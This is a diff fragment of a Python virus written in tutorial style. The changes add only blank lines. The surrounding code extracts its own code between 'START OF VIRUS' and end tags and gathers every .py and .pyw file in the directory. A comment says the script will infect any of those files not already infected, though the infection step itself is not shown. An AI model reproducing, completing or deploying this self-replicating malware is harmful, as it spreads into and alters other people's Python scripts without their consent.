@@ -6,6 +6,7 @@ import glob
 Getting the code of current file in a list
 '''
 code = []
+
 '''
 Open the current file.
 We don't wanna pass a static file name because, we're not going to use this file only. 
@@ -26,11 +27,13 @@ We are going to find the virus area. Because we don't wanna replicate all the co
 So we create a virus_area that's the indicator that were inside or outside of the virus area. We'll start with False because we are not in the virus area.
 '''
 virus_area = False
+
 '''
 And we filter out the virus code.
 We look for the starting tag, copy the code in between & then we stop iterating over the lines, once we reach the end tag
 '''
 for line in lines:
+    
     '''
     If the line that we're at right now happens to be START tag.
     And we are going to add a backslash n here because, when we use the read lines function it's going to have that.
@@ -38,6 +41,7 @@ for line in lines:
     '''
     if line == "### START OF VIRUS ###\n":
         virus_area = True
+    
     '''
     >>in next iteration.
     If the virus_area is True.
@@ -45,6 +49,7 @@ for line in lines:
     '''
     if virus_area:
         code.append(line)
+    
     '''
     If we stumble upon the line which has the content END tag.
         then get out of the loop.
@@ -63,6 +68,7 @@ And what we're going to end up with a list of file names that are python scripts
 '''
 python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
 #print(python_scripts)
+
 '''
 Now we're going to go through all those scripts. & first of all check if they're infected. & if they're not infected, infect them 
 '''
